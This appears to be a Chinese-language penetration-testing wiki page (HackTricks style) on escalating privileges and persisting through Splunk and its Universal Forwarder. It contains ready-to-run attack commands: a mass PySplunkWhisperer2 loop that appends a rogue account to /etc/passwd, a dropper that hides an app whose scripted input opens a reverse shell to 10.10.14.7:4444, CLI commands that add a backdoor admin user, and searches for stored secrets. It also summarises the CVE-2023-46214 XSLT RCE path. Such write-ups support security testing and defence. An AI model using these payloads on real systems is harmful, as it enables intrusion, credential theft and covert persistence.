# Splunk LPE 与 Persistence

{{#include ../../banners/hacktricks-training.md}}

如果在对机器进行**内部**或**外部枚举**时发现正在运行 **Splunk**（Web UI 通常使用 **8000**，management API 通常使用 **8089**），有效凭据通常可以通过 app 安装、scripted inputs 或 management actions 转化为 **code execution**。如果 Splunk 以 **root** 身份运行，这通常会立即导致**权限提升**。

如果你只需要通用的远程攻击面、枚举或 app-upload RCE 路径，请查看：

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

如果你**已经是 root**，并且 Splunk service 并非只监听 localhost，那么你还可以窃取 **Splunk password hashes**、恢复**加密 secrets**，或推送一个**恶意 app**，以便在本地或多个 forwarders 上维持 persistence。

## 有趣的本地文件

当你进入一台运行 Splunk 或 Splunk Universal Forwarder 的主机后，以下通常是最值得关注的路径：
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
重要 artifacts：

- **`$SPLUNK_HOME/etc/passwd`**：本地 Splunk 用户和密码哈希。
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**：Splunk 用于加密存储在多个 `.conf` 文件中的 secrets 的密钥。
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**：初始 admin bootstrap 文件；在 gold images 和 provisioning 错误中很有用。如果 `etc/passwd` 已存在，则会忽略该文件。
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**：通常用于启用 scripted inputs。
- **`$SPLUNK_HOME/etc/deployment-apps/`** 或 **`$SPLUNK_HOME/etc/apps/`**：适合隐藏 persistent app，或检查当前已分发的内容。

## Splunk Universal Forwarder Agent Exploit Summary

更多详情请查看 [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)。以下仅为摘要：<sup>[[1]](#references)</sup>

**Exploit 概览：**
针对 Splunk Universal Forwarder（UF）的 exploit 允许拥有 **agent password** 的攻击者在运行该 agent 的系统上执行任意代码，从而可能危及环境中的大量系统。

**原理：**

- UF management service 通常暴露在 **TCP 8089**。
- 攻击者可以向 API 进行 authentication，并指示 forwarder 安装一个 **malicious app bundle**。
- 同一 primitive 可在本地用于 **LPE**，也可远程用于 **RCE**。
- **SplunkWhisperer2** 等公开 tooling 可以自动创建 app bundle，并为 Linux targets 调整 payload。

**恢复 password 的常见方式：**

- documentation、scripts、shares 或 deployment automation 中的明文 credentials。
- `$SPLUNK_HOME/etc/passwd` 中的 password hashes，随后进行 offline cracking。
- gold images 或 provisioning leftovers，例如 `user-seed.conf`。

**影响：**

- 每台被攻陷主机上的 SYSTEM/root-level code execution。
- 部署 persistent apps、backdoors 或 ransomware。
- 在数据被转发之前禁用或篡改 telemetry。

**用于 exploitation 的示例命令：**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**可用的公开 exploits：**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## 通过 Scripted Inputs 或恶意 Apps 实现持久化

如果你以 `root`/`splunk` 身份拥有**文件系统写入权限**，或拥有用于安装 apps 的 authenticated access，那么放置一个包含 **scripted input** 的**自定义 app**是一种非常可靠的持久化机制。<sup>[[2]](#references)</sup> Splunk 自己的文档要求将 scripted inputs 放在 app 目录下，并通过 `inputs.conf` 启用。

典型布局：
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
最简 `inputs.conf`：
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
快速 Linux dropper：
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
备注：

- 同样的 trick 也适用于 **Universal Forwarder**，路径为 `/opt/splunkforwarder/etc/apps/`。
- Attackers 通常会通过修改合法的 add-on 来隐藏，而不是创建一个明显恶意的 app。
- 在 **deployment server** 上，将恶意 app 放入 `deployment-apps/` 会变成**全局持久化**，因为 forwarders 会轮询、下载更新后的 app，并且通常会重启以应用这些更新。

## 凭据窃取与管理员接管

如果你能够读取 Splunk 的本地文件，通常有两个很有价值的目标：恢复 **Splunk admin 访问权限**，以及恢复**加密的服务凭据**。

### 密码哈希与本地用户

Splunk 会将本地认证数据存储在 `etc/passwd` 中。根据部署方式的不同，破解该文件可能会恢复可用于 Web UI 和管理 API 的有效凭据。

如果你已经拥有有效的 **admin** 凭据，并且 Splunk 使用其 **native** authentication backend，那么 CLI 本身就可以用于持久化：
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` 和加密值

Splunk 使用 `etc/auth/splunk.secret` 保护存储在多个配置文件中的敏感值。如果你能同时窃取 **secret** 和相关的 **`.conf` 文件**，通常就可以恢复或重放：

- forwarder/indexer 共享 secret，例如 `pass4SymmKey`
- TLS private-key passwords，例如 `sslPassword`
- LDAP bind credentials，例如 `bindDNPassword`

即使 Splunk admin password 本身无法 crack，这对于 **lateral movement** 仍然很有用。

### `user-seed.conf` abuse

`user-seed.conf` 只会在首次启动或 `etc/passwd` 不存在时被读取。因此它在 live box 上的用处较小，但在以下场景中非常有价值：

- 被 compromise 的 installation templates
- container images
- unattended provisioning workflows
- Splunk 会被自动重新初始化的 appliances

在这些情况下，植入使用 `splunk hash-passwd` 生成的 `HASHED_PASSWORD`，可以让你在 redeployment 后以一种隐蔽的方式重新获得 admin access。

## Abusing Splunk Queries

For further details check [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>

一种近期有用的 technique 是在存在漏洞的 Splunk Enterprise 版本中滥用 **user-supplied XSLT**，将低权限的 authenticated account 转换为以 **`splunk` user** 身份执行 **OS command execution**。

High-level flow：

1. Authenticate to Splunk。
2. 通过 preview/upload functionality 上传恶意 **XSL** 文件。
3. 让 Splunk 使用来自 **dispatch** directory 的已上传 stylesheet 渲染 search results。
4. 使用 XSLT payload 写入文件，或通过 Splunk 的 search pipeline 触发 execution（例如访问 `runshellscript` 等 internal functionality）。

重要的 offensive takeaway 是，这条路径可以实现 **post-auth RCE without needing app upload**。在 Linux 上，它通常会让你进入 **`splunk`** account。这个 account 仍然很有价值，因为它通常拥有 application tree，可以读取 secrets，并且能够植入在 shell loss 后仍然存活的 persistent apps。

A representative path used during exploitation is:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
如果 Splunk 以过高的权限运行，或者 `splunk` 用户可以访问危险的 scripts、可写的 service units 或不安全的 `sudo` 规则，那么这就会形成一条清晰的 **LPE** 链。

## References

- [1] [Abusing Splunk Forwarders For RCE And Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [Beware of TraitorWare: Using Splunk for Persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [CVE-2023-46214 Analysis: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)

{{#include ../../banners/hacktricks-training.md}}
